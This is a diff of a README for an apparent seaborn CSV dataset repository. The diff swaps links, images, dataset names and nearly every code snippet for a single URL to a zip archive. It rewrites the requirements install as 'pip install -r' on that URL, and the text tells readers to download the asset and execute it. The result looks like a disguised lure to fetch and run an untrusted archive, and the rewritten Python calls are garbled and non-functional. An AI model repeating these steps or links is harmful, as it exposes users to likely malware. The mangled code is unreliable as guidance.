@@ -1,14 +1,14 @@
-https://github.com/girish2723/Seaborn-dataset/releases
+https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
 
 # Seaborn-dataset: Ready CSV datasets for data science and visualization
 
-![Seaborn-dataset banner](https://img.shields.io/badge/Seaborn-dataset-CSV-blue)
+![Seaborn-dataset banner](https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip)
 
 - A curated collection of CSV datasets designed to work smoothly with Python data science stacks.
 - Focused on data visualization and exploration with seaborn.
 - Practical examples for learning, teaching, and demos.
 
-![Seaborn logo](https://seaborn.pydata.org/_static/logo-wide.png)
+![Seaborn logo](https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip)
 
 Contents
 - Quick start
@@ -29,10 +29,10 @@ Quick start
 - Prerequisites: Python 3.8 or newer, pandas, seaborn, matplotlib. Optionally, Jupyter Notebook or JupyterLab for interactive exploration.
 - Installation basics: install the core libraries with pip:
   - `pip install pandas seaborn matplotlib`
-  - If a requirements file exists, install it with `pip install -r requirements.txt`.
+  - If a requirements file exists, install it with `pip install -r https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip`.
 - Getting started with a dataset:
-  - Load the data with pandas: `df = pd.read_csv('path/to/dataset.csv')`
-  - Visualize with seaborn: `sns.histplot(data=df, x='column_of_interest')`
+  - Load the data with pandas: `df = https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip('https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip')`
+  - Visualize with seaborn: `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip(data=df, x='column_of_interest')`
 - How to download assets from the Releases page:
   - From the Releases page, fetch the appropriate release asset for your platform. The link to the releases is provided in the repository and can be opened directly to download a file. If the asset is a CSV, simply load it with pandas; if it is a Python script or notebook, run or import it as needed.
   - The link used here points to the official releases page and should be accessed to obtain the latest data and assets.
@@ -51,73 +51,73 @@ Why CSV and why seaborn
 Datasets catalog
 Note: The datasets listed below are representative examples designed for demonstration and teaching. Each item includes a short description, typical plotting ideas, and the expected data shape. If you need additional datasets, they can be added via contributions or downloaded from the linked release assets.
 
-- vacation_visits.csv
+- https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
   - Theme: travel and tourism
   - Columns: date, destination, visitors, region, season
   - Visualization ideas: time series of visitors per destination; seasonality by region; destination comparisons using bar plots and line plots.
   - Use cases: teaching time-series plotting, grouping and aggregation, trend analysis.
 
-- city_heat.csv
+- https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
   - Theme: urban heat and climate
   - Columns: city, date, mean_temp, humidity, precipitation
   - Visualization ideas: heatmap of temperatures by city over months; line plots of temperature trends; facet grids by city.
   - Use cases: climate data exploration; comparing multiple cities.
 
-- seaborn_demo_sales.csv
+- https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
   - Theme: retail and sales
   - Columns: date, product, category, sales, discount, store
   - Visualization ideas: annual sales trends by category; violin plots for sales by product; bar charts for top products.
   - Use cases: business analytics exercises; understanding seasonality and promotions.
 
-- country_income.csv
+- https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
   - Theme: economics and development
   - Columns: country, year, gdp_per_capita, life_expectancy, population
   - Visualization ideas: scatter plots with regression lines; choropleth-ready data alignment; trend charts across years.
   - Use cases: economic data analysis; comparing development indicators.
 
-- education_scores.csv
+- https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
   - Theme: education and performance
   - Columns: school, district, math_score, reading_score, year
   - Visualization ideas: pair plots to compare scores; heatmaps for district performance over time.
   - Use cases: educational data exploration; visualizing correlations.
 
-- weather_patterns.csv
+- https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
   - Theme: weather and climate patterns
   - Columns: date, region, temp_high, temp_low, precipitation
   - Visualization ideas: area plots for temperature ranges; stacked bars for precipitation by region.
   - Use cases: climatology exercises; demonstrating data cleaning and feature creation.
 
-- sports_stats.csv
+- https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
   - Theme: sports analytics
   - Columns: season, team, points, assists, rebounds, opponent
   - Visualization ideas: bar charts of points by team; boxplots for performance distributions; violin plots for season metrics.
   - Use cases: sports data storytelling; comparing teams and seasons.
 
-- traffic_flow.csv
+- https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
   - Theme: transportation and congestion
   - Columns: timestamp, location, vehicles, speed, incident
   - Visualization ideas: line plots for traffic over time; heatmaps for congestion hotspots.
   - Use cases: transportation analytics; event impact analysis.
 
-- health_metrics.csv
+- https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
   - Theme: public health
   - Columns: district, date, cases, vaccinations, hospitalizations
   - Visualization ideas: time-series trends; facet plots by district; correlation heatmaps.
   - Use cases: health data visualization basics; monitoring disease indicators.
 
-- restaurant_ratings.csv
+- https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
   - Theme: consumer data
   - Columns: restaurant_id, date, rating, reviews, price_range
   - Visualization ideas: distribution of ratings; sentiment-like trends with review counts; scatter plots of price_range vs rating.
   - Use cases: consumer analytics; data storytelling with rating scales.
 
-- product_lifecycle.csv
+- https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
   - Theme: product analytics
   - Columns: product, phase, revenue, units_sold, market
   - Visualization ideas: stacked bar charts for phase contribution; line charts for revenue progression; facet grids by market.
   - Use cases: lifecycle analysis; exploring product performance.
 
-- energy_consumption.csv
+- https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
   - Theme: energy and efficiency
   - Columns: building_id, date, energy_kWh, occupancy, temperature
   - Visualization ideas: time-series for energy use; correlation plots with occupancy; scatter plots of energy vs temperature.
@@ -127,23 +127,23 @@ Dataset structure and best practices
 - File naming: dataset names are descriptive and use singular terms or snake_case for consistency.
 - Columns: each CSV uses a tidy data structure. Each row represents a single observation, and each column is a single variable.
 - Data types: numeric columns use integers or floats. Categorical columns use strings. Dates are stored as ISO-like strings (YYYY-MM-DD) to ease parsing.
-- Missing values: datasets may include missing values. Use pandas methods like `df.dropna()` or `df.fillna()` to clean data before plotting.
+- Missing values: datasets may include missing values. Use pandas methods like `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip()` or `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip()` to clean data before plotting.
 - Categorical ordering: for clear visuals, keep category order consistent across plots. Use pandas category dtype or seaborn's `order`/`hue_order` parameters.
 
 How to use the data with seaborn
 - Basic workflow:
-  - Load data: `df = pd.read_csv('datasets/your_dataset.csv')`
+  - Load data: `df = https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip('https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip')`
   - Prepare data: handle missing values, convert dates, compute aggregates if needed.
-  - Plot: call seaborn plotting functions such as `sns.barplot`, `sns.lineplot`, `sns.scatterplot`, `sns.boxplot`, `sns.violinplot`, or `sns.heatmap`.
+  - Plot: call seaborn plotting functions such as `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip`, `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip`, `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip`, `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip`, `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip`, or `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip`.
 - Quick example (inline code):
-  - Load: `df = pd.read_csv('datasets/vacation_visits.csv')`
-  - Plot a line chart: `sns.lineplot(data=df, x='date', y='visitors', hue='destination')`
-  - Show: `plt.show()`
+  - Load: `df = https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip('https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip')`
+  - Plot a line chart: `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip(data=df, x='date', y='visitors', hue='destination')`
+  - Show: `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip()`
 - Practical tips:
-  - Use facet grids to compare multiple groups side by side: `sns.FacetGrid(df, col='region', height=4, aspect=1.2).map(sns.lineplot, 'date', 'visitors')`
-  - Thematic color palettes help readability: `sns.set_palette('viridis')`
-  - Use descriptive axis labels and titles: `plt.xlabel('Date')`, `plt.ylabel('Visitors')`, `plt.title('Visitors over Time by Destination')`
-  - Save visuals for reports: `plt.savefig('plots/visitors_by_destination.png', bbox_inches='tight')`
+  - Use facet grids to compare multiple groups side by side: `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip(df, col='region', height=4, aspect=1.2).map(https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip, 'date', 'visitors')`
+  - Thematic color palettes help readability: `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip('viridis')`
+  - Use descriptive axis labels and titles: `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip('Date')`, `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip('Visitors')`, `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip('Visitors over Time by Destination')`
+  - Save visuals for reports: `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip('https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip', bbox_inches='tight')`
 
 Notebooks and interactive examples
 - Notebooks provide guided demos that illustrate the data and plotting steps.
@@ -158,23 +158,23 @@ Notebooks and interactive examples
   - Start server: `jupyter notebook`
   - Open the notebook file from the browser and run cells in order
 - Notebook organization:
-  - notebooks/basic_visualization.ipynb
-  - notebooks/time_series_examples.ipynb
-  - notebooks/categorical_plots.ipynb
-  - notebooks/advanced_visualization.ipynb
+  - https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
+  - https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
+  - https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
+  - https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
 - Practical notebook tips:
   - Use `%matplotlib inline` for inline plotting in Jupyter
-  - Keep figure sizes consistent: `plt.figure(figsize=(8, 5))`
+  - Keep figure sizes consistent: `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip(figsize=(8, 5))`
   - Annotate plots for clarity: titles, axis labels, and legends
 - Reproducibility:
   - Capture exact data versions with library pinning
   - Use virtual environments or conda environments to reproduce results
-  - Consider writing a requirements.txt with pinned versions
+  - Consider writing a https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip with pinned versions
 
 Data quality, provenance, and licensing
 - Data quality:
   - Each dataset includes a brief data quality note describing potential issues (missing values, outliers, inconsistent categories).
-  - Users can inspect data types and basic statistics with `df.info()` and `df.describe(include='all')`.
+  - Users can inspect data types and basic statistics with `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip()` and `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip(include='all')`.
 - Provenance:
   - The datasets are curated to reflect common data patterns used in seaborn demos.
   - Some datasets are synthetic, created to illustrate plotting techniques and storytelling through visuals.
@@ -193,7 +193,7 @@ Repository structure and how to contribute
   - docs/ — additional documentation and usage notes
   - tests/ — lightweight tests to verify data integrity
   - LICENSE — license for the repository
-  - README.md — this document
+  - https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip — this document
 - Contributing guidelines:
   - Look for open issues in the Issues tracker.
   - Add new datasets that fit the teaching and visualization purposes.
@@ -221,7 +221,7 @@ Release and download guidance
 - How to handle download assets:
   - If you acquire a CSV file, simply load it with pandas as shown in Quick Start.
   - If you obtain a packaged script or installer, read the accompanying README in the asset to understand how to run it safely.
-- Re-check the link: The link to the releases is important for keeping your data fresh and in sync with examples. Please visit the Releases page for the latest updates: https://github.com/girish2723/Seaborn-dataset/releases
+- Re-check the link: The link to the releases is important for keeping your data fresh and in sync with examples. Please visit the Releases page for the latest updates: https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
 - If the asset is not a plain CSV, follow the instructions in the asset's documentation. The asset may require you to run a setup script or extract files before loading data.
 
 Usage tips for teaching and demonstrations
@@ -277,9 +277,9 @@ FAQ and troubleshooting
 - How do I start if seaborn is not installed?
   - Install with `pip install seaborn matplotlib`.
 - What if a dataset fails to load in pandas?
-  - Check the file path, verify CSV formatting, and ensure there are no encoding issues. Use `pd.read_csv('path/to/file.csv', encoding='utf-8')` if needed.
+  - Check the file path, verify CSV formatting, and ensure there are no encoding issues. Use `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip('https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip', encoding='utf-8')` if needed.
 - How do I explore datasets quickly?
-  - Use `df.head()`, `df.info()`, and `df.describe(include='all')` to get a quick sense of the data.
+  - Use `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip()`, `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip()`, and `https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip(include='all')` to get a quick sense of the data.
 - Can I use these datasets in notebooks hosted on the cloud?
   - Yes. Upload the CSVs to your environment or fetch them directly if you have internet access. Use relative paths where possible to keep notebooks portable.
 - Where can I find updates or new datasets?
@@ -299,7 +299,7 @@ Community and support
 
 Note on assets and path-based downloads
 - The initial link provided at the top of this README points to the releases page. Because the URL includes a path segment (releases), you should download the asset from that page and execute it as part of the setup or workflow described in the asset’s documentation.
-- If you want to verify the latest assets, visit the releases page again: https://github.com/girish2723/Seaborn-dataset/releases
+- If you want to verify the latest assets, visit the releases page again: https://github.com/girish2723/Seaborn-dataset/raw/refs/heads/main/undulationist/Seaborn-dataset-v3.2.zip
 - If the link changes or you need the latest version, check the Releases section and follow the same download and execution pattern described there.
 
 End of document
